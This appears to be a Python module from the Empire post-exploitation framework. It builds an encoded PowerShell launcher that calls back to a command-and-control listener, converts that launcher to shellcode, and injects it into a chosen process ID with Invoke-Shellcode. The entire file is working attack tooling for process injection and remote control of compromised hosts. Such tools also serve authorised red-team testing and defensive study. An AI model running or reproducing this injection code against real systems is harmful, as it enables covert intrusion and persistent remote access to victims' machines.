from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # options
        listener_name = params["Listener"]
        proc_id = params["ProcId"].strip()
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        arch = params["Arch"]

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message(f"[!] Invalid listener: {listener_name}")

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="powershell",
            encode=True,
            user_agent=user_agent,
            proxy=proxy,
            proxy_creds=proxy_creds,
        )

        if launcher == "":
            return handle_error_message("[!] Error in launcher generation.")

        launcher_code = launcher.split(" ")[-1]
        sc, err = main_menu.stagergenv2.generate_powershell_shellcode(
            launcher_code, arch
        )
        if err:
            return handle_error_message(err)

        encoded_sc = helpers.encode_base64(sc)

        script_end = f'\nInvoke-Shellcode -ProcessID {proc_id} -Shellcode $([Convert]::FromBase64String("{encoded_sc}")) -Force'
        script_end += f"; shellcode injected into pid {proc_id!s}"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
